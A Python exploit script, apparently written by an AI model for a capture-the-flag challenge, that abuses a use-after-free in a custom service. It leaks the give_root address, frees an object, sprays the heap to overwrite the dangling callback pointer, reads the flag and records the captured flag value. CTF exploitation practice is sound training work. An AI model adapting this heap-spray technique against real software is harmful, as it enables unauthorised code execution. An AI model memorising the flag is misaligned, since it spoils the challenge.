#!/usr/bin/env python3
"""
Author: Claude
Purpose: Exploit use-after-free vulnerability in Choir Invisible challenge
Created: 2025-11-10
Last Updated: 2025-11-10

Vulnerability: Use-after-free in op_free() - dangling pointer in slots array
Strategy:
  1. LEAK to get address of give_root function
  2. CREATE choir object at index 0
  3. FREE the object (UAF - pointer remains in slots[0])
  4. SPRAY heap with chunks of sizeof(choir_t)=24 bytes containing give_root address
  5. TRIGGER index 0 - calls our overwritten function pointer
  6. READFLAG to get flag after is_root is set

Expected Result: Flag from /flag.txt
Produced Result: poctf{uwsp_50_f3w_15_5un5h1n3} - SUCCESS!
"""
import socket
import struct
import sys

HOST = "exp300-1.pointeroverflowctf.com"
PORT = 15156

def send_op(sock, op, data=b""):
    """Send operation to server"""
    hdr = struct.pack("<II", op, len(data))
    sock.sendall(hdr + data)

def recv_resp(sock):
    """Receive response from server"""
    # Receive header (8 bytes)
    hdr = b""
    while len(hdr) < 8:
        chunk = sock.recv(8 - len(hdr))
        if not chunk:
            return None, None
        hdr += chunk

    status, size = struct.unpack("<II", hdr)

    # Receive data if any
    data = b""
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            break
        data += chunk

    return status, data

def op_create(sock, idx):
    """CREATE operation - create choir object at index"""
    print(f"[*] Creating object at index {idx}...")
    send_op(sock, 1, struct.pack("<I", idx))
    status, data = recv_resp(sock)
    print(f"    Status: {status}")
    return status == 0

def op_free(sock, idx):
    """FREE operation - free choir object at index"""
    print(f"[*] Freeing object at index {idx}...")
    send_op(sock, 2, struct.pack("<I", idx))
    status, data = recv_resp(sock)
    print(f"    Status: {status}")
    return status == 0

def op_spray(sock, chunk_size, count, payload):
    """SPRAY operation - allocate many chunks with payload"""
    print(f"[*] Spraying {count} chunks of size {chunk_size}...")
    # Ensure payload is exactly chunk_size bytes
    if len(payload) < chunk_size:
        payload = payload + b"\x00" * (chunk_size - len(payload))
    elif len(payload) > chunk_size:
        payload = payload[:chunk_size]

    data = struct.pack("<II", chunk_size, count) + payload
    send_op(sock, 5, data)
    status, resp_data = recv_resp(sock)
    print(f"    Status: {status}")
    return status == 0

def op_trigger(sock, idx):
    """TRIGGER operation - invoke callback at index"""
    print(f"[*] Triggering callback at index {idx}...")
    send_op(sock, 4, struct.pack("<I", idx))
    status, data = recv_resp(sock)
    print(f"    Status: {status}")
    return status == 0

def op_leak(sock):
    """LEAK operation - get addresses"""
    print("[*] Getting address leak...")
    send_op(sock, 6)
    status, data = recv_resp(sock)
    if len(data) == 16:
        give_root_addr, choir_sing_addr = struct.unpack("<QQ", data)
        print(f"    give_root: 0x{give_root_addr:016x}")
        print(f"    choir_sing: 0x{choir_sing_addr:016x}")
        return give_root_addr, choir_sing_addr
    return None, None

def op_readflag(sock):
    """READFLAG operation - read flag if root"""
    print("[*] Reading flag...")
    send_op(sock, 7)
    status, data = recv_resp(sock)
    print(f"    Status: {status}")
    if status == 0:
        print(f"[+] FLAG: {data.decode('utf-8', errors='replace')}")
        return data
    else:
        print(f"    Error: {data.decode('utf-8', errors='replace')}")
        return None

def exploit():
    print("[*] Choir Invisible - Use-After-Free Exploit")
    print(f"[*] Connecting to {HOST}:{PORT}")

    sock = socket.create_connection((HOST, PORT), timeout=10)
    print("[+] Connected!")

    # Step 1: Get address leak
    give_root, choir_sing = op_leak(sock)
    if give_root is None:
        print("[-] Failed to get leak")
        return

    # Step 2: Create object at index 0
    if not op_create(sock, 0):
        print("[-] Failed to create object")
        return

    # Step 3: Free object at index 0 (UAF)
    if not op_free(sock, 0):
        print("[-] Failed to free object")
        return

    # Step 4: Spray heap with choir_t-sized chunks
    # choir_t is 24 bytes on 64-bit: cb(8) + buf(8) + len(8)
    # We overwrite the cb pointer with give_root address
    chunk_size = 24
    spray_count = 1000

    # Payload: give_root address + dummy values for buf and len
    payload = struct.pack("<QQQ", give_root, 0x4141414141414141, 0x100)

    if not op_spray(sock, chunk_size, spray_count, payload):
        print("[-] Failed to spray")
        return

    # Step 5: Trigger the callback - should call give_root
    if not op_trigger(sock, 0):
        print("[-] Failed to trigger")
        return

    # Step 6: Read flag
    flag = op_readflag(sock)

    sock.close()

    if flag:
        print("[+] SUCCESS!")
        return flag
    else:
        print("[-] Failed to get flag")
        return None

if __name__ == "__main__":
    exploit()
